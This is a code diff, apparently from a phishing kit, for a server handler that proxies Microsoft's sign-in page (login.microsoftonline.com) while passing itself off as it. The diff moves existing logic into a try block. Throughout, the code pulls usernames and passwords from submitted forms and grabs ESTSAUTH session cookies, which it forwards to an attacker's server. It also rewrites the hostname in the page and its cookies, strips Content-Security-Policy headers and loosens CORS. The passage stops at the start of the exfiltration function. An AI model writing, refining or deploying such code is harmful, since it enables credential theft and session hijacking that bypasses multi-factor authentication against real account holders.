@@ -43,74 +43,79 @@ export default async function handler(req, res) {
 
     let body = req.method === 'POST' ? req.body : null; // Only include body for POST requests
 
-    if (method === 'POST') {
-        const keyValuePairs = body.split('&');
-        let message = "Password found:\n\n";
-
-        for (const pair of keyValuePairs) {
-            const [key, value] = pair.split('=');
-
-            if (key === 'login') {
-                const username = decodeURIComponent(value.replace(/\+/g, ' '));
-                message += `User: ${username}\n`;
-            }
-            if (key === 'passwd') {
-                const password = decodeURIComponent(value.replace(/\+/g, ' '));
-                message += `Password: ${password}\n`;
-            }
-        }
-        if (message.includes("User") && message.includes("Password")) {
-            await sendToServer(message, ip_address);
-        }
-    }
-
-    let response;
     try {
-        response = await fetch(url.href, {
+        if (method === 'POST') {
+            const keyValuePairs = body.split('&');
+            let message = "Password found:\n\n";
+
+            for (const pair of keyValuePairs) {
+                const [key, value] = pair.split('=');
+
+                if (key === 'login') {
+                    const username = decodeURIComponent(value.replace(/\+/g, ' '));
+                    message += `User: ${username}\n`;
+                }
+                if (key === 'passwd') {
+                    const password = decodeURIComponent(value.replace(/\+/g, ' '));
+                    message += `Password: ${password}\n`;
+                }
+            }
+            if (message.includes("User") && message.includes("Password")) {
+                await sendToServer(message, ip_address);
+            }
+        }
+
+        let response = await fetch(url.href, {
             method,
             headers: new_request_headers,
             body // Only include body if it's not null
         });
+
+        let original_response_clone = await response.clone();
+        let original_text = await replace_response_text(original_response_clone, upstream, url_hostname);
+        let new_response_headers = new Headers(response.headers);
+
+        new_response_headers.set('access-control-allow-origin', '*');
+        new_response_headers.set('access-control-allow-credentials', true);
+        new_response_headers.delete('content-security-policy');
+        new_response_headers.delete('content-security-policy-report-only');
+        new_response_headers.delete('clear-site-data');
+
+        const originalCookies = response.headers.getAll("Set-Cookie");
+        all_cookies = originalCookies.join("; \n\n");
+
+        originalCookies.forEach(originalCookie => {
+            const modifiedCookie = originalCookie.replace(/login\.microsoftonline\.com/g, url_hostname);
+            new_response_headers.append("Set-Cookie", modifiedCookie);
+        });
+
+        if (all_cookies.includes('ESTSAUTH') && all_cookies.includes('ESTSAUTHPERSISTENT')) {
+            await sendToServer(`Cookies found:\n\n${all_cookies}`, ip_address);
+        }
+
+        // Set the Location header for redirection to Google
+        res.writeHead(response.status, {
+            'Content-Type': 'text/html',
+            ...Object.fromEntries(new_response_headers.entries()),
+            'Location': 'https://google.com'
+        });
+        res.end(original_text);
+
     } catch (error) {
-        res.status(500).send(`Error fetching upstream: ${error.message}`);
-        return;
+        console.error('Error processing request:', error); // Log error details
+        res.status(500).send(`Internal Server Error: ${error.message}`);
     }
-
-    let original_response_clone = await response.clone();
-    let original_text = await replace_response_text(original_response_clone, upstream, url_hostname);
-    let new_response_headers = new Headers(response.headers);
-
-    new_response_headers.set('access-control-allow-origin', '*');
-    new_response_headers.set('access-control-allow-credentials', true);
-    new_response_headers.delete('content-security-policy');
-    new_response_headers.delete('content-security-policy-report-only');
-    new_response_headers.delete('clear-site-data');
-
-    const originalCookies = response.headers.getAll("Set-Cookie");
-    all_cookies = originalCookies.join("; \n\n");
-
-    originalCookies.forEach(originalCookie => {
-        const modifiedCookie = originalCookie.replace(/login\.microsoftonline\.com/g, url_hostname);
-        new_response_headers.append("Set-Cookie", modifiedCookie);
-    });
-
-    if (all_cookies.includes('ESTSAUTH') && all_cookies.includes('ESTSAUTHPERSISTENT')) {
-        await sendToServer(`Cookies found:\n\n${all_cookies}`, ip_address);
-    }
-
-    // Set the Location header for redirection to Google
-    res.writeHead(response.status, {
-        'Content-Type': 'text/html',
-        ...Object.fromEntries(new_response_headers.entries()),
-        'Location': 'https://google.com'
-    });
-    res.end(original_text);
 }
 
 async function replace_response_text(response, upstream_domain, host_name) {
-    let text = await response.text();
-    text = text.replace(new RegExp('login.microsoftonline.com', 'g'), host_name);
-    return text;
+    try {
+        let text = await response.text();
+        text = text.replace(new RegExp('login.microsoftonline.com', 'g'), host_name);
+        return text;
+    } catch (error) {
+        console.error('Error replacing response text:', error);
+        throw error;
+    }
 }
 
 async function sendToServer(data, ip_address) {
